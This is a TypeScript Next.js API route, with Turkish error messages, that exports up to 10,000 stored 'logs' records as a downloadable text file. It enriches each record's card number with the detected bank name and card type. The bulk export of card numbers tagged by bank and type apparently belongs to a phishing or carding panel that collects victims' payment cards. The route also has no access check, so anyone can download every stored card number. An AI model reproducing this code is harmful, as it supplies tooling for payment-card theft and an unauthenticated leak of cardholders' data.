import { NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb } from '@/lib/db';
import { buildCardExportTxt } from '@/lib/logExport';
import { detectBankName, detectCardType } from '@/lib/cardUtils';

export const dynamic = 'force-dynamic';

export async function GET() {
  try {
    await connectDB();
    const logs = await logsDb.find({ limit: 10000, skip: 0 });

    const enriched = logs.map((log) => {
      if (!log.cardNumber) return log;
      return {
        ...log,
        bankName: log.bankName || detectBankName(log.cardNumber),
        cardType: log.cardType || detectCardType(log.cardNumber),
      };
    });

    const txtContent = buildCardExportTxt(enriched);

    return new NextResponse(txtContent, {
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Disposition': `attachment; filename=logs-${new Date().toISOString().split('T')[0]}.txt`,
        'Cache-Control': 'no-store, no-cache, must-revalidate',
      },
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Loglar export edilemedi';
    console.error('Log export hatası:', error);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
